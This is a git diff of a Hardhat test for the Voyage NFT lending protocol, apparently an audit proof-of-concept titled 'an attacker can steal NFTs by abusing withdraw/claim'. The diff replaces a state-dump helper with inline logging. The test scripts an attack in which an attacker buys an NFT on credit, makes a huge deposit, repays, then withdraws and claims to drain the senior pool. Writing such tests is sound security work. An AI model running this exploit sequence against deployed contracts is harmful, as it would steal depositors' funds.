@@ -1,4 +1,3 @@
-import { JuniorDepositToken, SeniorDepositToken, WETH9 } from '@contracts';
 import { REFUND_GAS_PRICE, REFUND_GAS_UNIT } from '@helpers/constants';
 import { MAX_UINT_256 } from '@helpers/math';
 import { setupTestSuite } from '@helpers/setupTestSuite';
@@ -27,16 +26,6 @@ describe('an attacker can steal NFTs by abusing withdraw/claim', async () => {
       seniorDepositToken,
       reserveConfiguration,
     } = await setupTestSuite();
-
-    await dumpState(
-      'Initial state',
-      weth,
-      juniorDepositToken,
-      seniorDepositToken,
-      alice,
-      bob,
-      undefined
-    );
 
     /* ----------- cause Alice to deposit 6k ETH to the senior tranche ----------- */
     // deposit 3k ETH to junior
@@ -69,16 +58,6 @@ describe('an attacker can steal NFTs by abusing withdraw/claim', async () => {
     );
     expect(await seniorDepositToken.totalAssets()).to.equal(
       initialSeniorDeposit
-    );
-
-    await dumpState(
-      'State after Alice deposits',
-      weth,
-      juniorDepositToken,
-      seniorDepositToken,
-      alice,
-      bob,
-      undefined
     );
 
     /* ----------------- have Bob purchase an NFT valued at 9ETH ---------------- */
@@ -155,23 +134,8 @@ describe('an attacker can steal NFTs by abusing withdraw/claim', async () => {
         looksRareMakerOrderData
       )
     ).data!;
-
-    const bVoyage = voyage.connect(bSigner);
-
-    // approve marketplace
-    bVoyage.approveMarketplace(bVaultAddress, marketPlace.address, false);
-
-    await dumpState(
-      'Before buy',
-      weth,
-      juniorDepositToken,
-      seniorDepositToken,
-      alice,
-      bob,
-      bVaultAddress
-    );
-
     // buy
+    const bVoyage = voyage.connect(bSigner);
     console.log('bob buyNow');
     await bVoyage.buyNow(
       crab.address,
@@ -180,39 +144,30 @@ describe('an attacker can steal NFTs by abusing withdraw/claim', async () => {
       marketPlace.address,
       calldata
     );
-    await dumpState(
-      'After buy',
-      weth,
-      juniorDepositToken,
-      seniorDepositToken,
-      alice,
-      bob,
-      bVaultAddress
+    console.log('----after buy----\n');
+    console.log(
+      'Available liquidity: ',
+      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
+    );
+    console.log(
+      'Total assets:',
+      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
     );
 
     /* ----------------- have Bob deposit a large amount of WETH ---------------- */
     await bWeth.deposit({ value: ethers.utils.parseEther('1000000') });
-    await dumpState(
-      "Before Bob's deposit",
-      weth,
-      juniorDepositToken,
-      seniorDepositToken,
-      alice,
-      bob,
-      bVaultAddress
-    );
     await bWeth.approve(voyage.address, MAX_UINT_256);
     // deposit ~10x totalAssets()
     const bDeposit = ethers.utils.parseEther('1000000');
     await bVoyage.deposit(crab.address, 1, bDeposit);
-    await dumpState(
-      "After Bob's deposit",
-      weth,
-      juniorDepositToken,
-      seniorDepositToken,
-      alice,
-      bob,
-      bVaultAddress
+    console.log('----after deposit----\n');
+    console.log(
+      'Available liquidity: ',
+      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
+    );
+    console.log(
+      'Total assets:',
+      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
     );
 
     /* --------------------- have Bob repay both instalments -------------------- */
@@ -221,25 +176,25 @@ describe('an attacker can steal NFTs by abusing withdraw/claim', async () => {
     const pmtInterest = loan.pmt.interest;
     await bWeth.transfer(bVaultAddress, ethers.utils.parseEther('7'));
     await bVoyage.repay(crab.address, 0, bVaultAddress);
-    await dumpState(
-      'After repay 1',
-      weth,
-      juniorDepositToken,
-      seniorDepositToken,
-      alice,
-      bob,
-      bVaultAddress
+    console.log('----after repay 1----\n');
+    console.log(
+      'Available liquidity: ',
+      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
     );
-
+    console.log(
+      'Total assets: ',
+      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
+    );
     await bVoyage.repay(crab.address, 0, bVaultAddress);
-    await dumpState(
-      'After repay 2',
-      weth,
-      juniorDepositToken,
-      seniorDepositToken,
-      alice,
-      bob,
-      bVaultAddress
+
+    console.log('----after repay 2----\n');
+    console.log(
+      'Available liquidity: ',
+      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
+    );
+    console.log(
+      'Total assets: ',
+      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
     );
 
     /* ----------------------- have Bob withdraw his WETH ----------------------- */
@@ -249,19 +204,43 @@ describe('an attacker can steal NFTs by abusing withdraw/claim', async () => {
         .add(pmtInterest.mul(3).percentMul(reserveConfiguration.incomeRatio))
     );
     const bBalance0 = await seniorDepositToken.maxWithdraw(bob);
+    console.log(
+      'Bob withdrawable balance: ',
+      ethers.utils.formatEther(bBalance0)
+    );
+    const aBalance0 = await seniorDepositToken.maxWithdraw(alice);
+    console.log(
+      'Alice withdrawable balance: ',
+      ethers.utils.formatEther(aBalance0)
+    );
+    console.log(
+      'Total withdrawable: ',
+      ethers.utils.formatEther(bBalance0.add(aBalance0))
+    );
 
     await seniorDepositToken
       .connect(bSigner)
       .approve(voyage.address, MAX_UINT_256);
     await bVoyage.withdraw(crab.address, 1, bBalance0);
-    await dumpState(
-      'After withdraw',
-      weth,
-      juniorDepositToken,
-      seniorDepositToken,
-      alice,
-      bob,
-      bVaultAddress
+
+    console.log('----after withdraw----\n');
+    console.log(
+      'Available liquidity: ',
+      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
+    );
+    console.log(
+      'Total assets: ',
+      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
+    );
+    const bBalance1 = await seniorDepositToken.maxWithdraw(bob);
+    console.log(
+      'Bob withdrawable balance: ',
+      ethers.utils.formatEther(bBalance1)
+    );
+    const aBalance1 = await seniorDepositToken.maxWithdraw(alice);
+    console.log(
+      'Alice withdrawable balance: ',
+      ethers.utils.formatEther(aBalance1)
     );
 
     /* ----------------------------- have Bob claim ----------------------------- */
@@ -270,79 +249,23 @@ describe('an attacker can steal NFTs by abusing withdraw/claim', async () => {
     const wethBalance1 = await weth.balanceOf(bob);
     const totalClaimed = wethBalance1.sub(wethBalance0);
     expect(totalClaimed).to.equal(bBalance0);
-    await dumpState(
-      'After claim',
-      weth,
-      juniorDepositToken,
-      seniorDepositToken,
-      alice,
-      bob,
-      bVaultAddress
+
+    console.log('----after claim----\n');
+    console.log(
+      'Available liquidity: ',
+      ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
     );
+    console.log(
+      'Total assets:',
+      ethers.utils.formatEther(await seniorDepositToken.totalAssets())
+    );
+    const aBalance2 = await seniorDepositToken.maxWithdraw(alice);
+    console.log(
+      'Alice withdrawable balance: ',
+      ethers.utils.formatEther(aBalance2)
+    );
+    // await seniorDepositToken.connect(bSigner).claim();
+    // const wethBalance2 = await weth.balanceOf(bob);
+    // expect(wethBalance2).to.equal(wethBalance1);
   });
 });
-
-async function dumpState(
-  event: string,
-  weth: WETH9,
-  juniorDepositToken: JuniorDepositToken,
-  seniorDepositToken: SeniorDepositToken,
-  alice: string,
-  bob: string,
-  bVaultAddress: string | undefined
-) {
-  console.log('------- ' + event + ' ------');
-  // Junior pool state
-  console.log(
-    'Junior WETH balance: ',
-    ethers.utils.formatEther(await weth.balanceOf(juniorDepositToken.address))
-  );
-  console.log(
-    'Junior totalAssets(): ',
-    ethers.utils.formatEther(await juniorDepositToken.totalAssets())
-  );
-
-  // Senior pool state
-  console.log(
-    'Senior WETH balance: ',
-    ethers.utils.formatEther(await weth.balanceOf(seniorDepositToken.address))
-  );
-  console.log(
-    'Senior totalAssets(): ',
-    ethers.utils.formatEther(await seniorDepositToken.totalAssets())
-  );
-
-  // Alice state
-  console.log(
-    'Alice WETH balance: ',
-    ethers.utils.formatEther(await weth.balanceOf(alice))
-  );
-  console.log(
-    'Alice junior withdrawable balance: ',
-    ethers.utils.formatEther(await juniorDepositToken.maxWithdraw(alice))
-  );
-  console.log(
-    'Alice senior withdrawable balance: ',
-    ethers.utils.formatEther(await seniorDepositToken.maxWithdraw(alice))
-  );
-
-  // Bob state
-  console.log(
-    'Bob WETH balance: ',
-    ethers.utils.formatEther(await weth.balanceOf(bob))
-  );
-  console.log(
-    'Bob junior withdrawable balance: ',
-    ethers.utils.formatEther(await juniorDepositToken.maxWithdraw(bob))
-  );
-  console.log(
-    'Bob senior withdrawable balance: ',
-    ethers.utils.formatEther(await seniorDepositToken.maxWithdraw(bob))
-  );
-  if (bVaultAddress !== undefined) {
-    console.log(
-      'Bob vault WETH balance: ',
-      ethers.utils.formatEther(await weth.balanceOf(bVaultAddress))
-    );
-  }
-}
